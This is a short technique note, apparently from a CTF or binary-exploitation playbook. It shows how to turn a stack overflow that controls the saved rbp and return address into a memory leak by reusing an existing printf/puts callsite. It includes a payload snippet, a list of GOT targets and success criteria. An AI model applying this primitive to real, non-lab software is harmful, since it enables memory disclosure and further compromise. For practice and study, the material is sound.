# Frame-Indexed Callsite Leak

## Pattern

A function contains a frame-indexed argument setup followed by an original callsite:

```asm
lea rax, [rbp-k]
mov rdi, rax
call printf/puts/write/system/...
```

and the same function has an overflow that controls saved `rbp` and saved return address.

## Primitive

Set:

```text
saved_rbp = target + k
saved_rip = callsite_before_argument_setup
```

Then the original function executes the existing callsite with an argument selected by `rbp`:

```c
printf(target)
puts(target)
```

Saved `rbp` is not only a pivot. It is also an argument selector.

## First targets

- `printf@got`
- `puts@got`
- `read@got`
- `__libc_start_main@got`
- fixed `.data` / `.bss` / global strings / global pointers

## Minimal probe

```python
payload  = b"A" * offset
payload += p64(target + k)
payload += p64(callsite)
```

## Oracle

- raw pointer bytes are printed before crash/EOF;
- printable bytes from `target` appear;
- EOF/crash after output still counts as primitive success.

## Stop rule

Do not start fake-stack libc call stability, GOT-page rewrite loops, format-write closure, or one_gadget polishing before this probe is run or genuinely falsified.

Complex closure failure does not falsify this primitive.
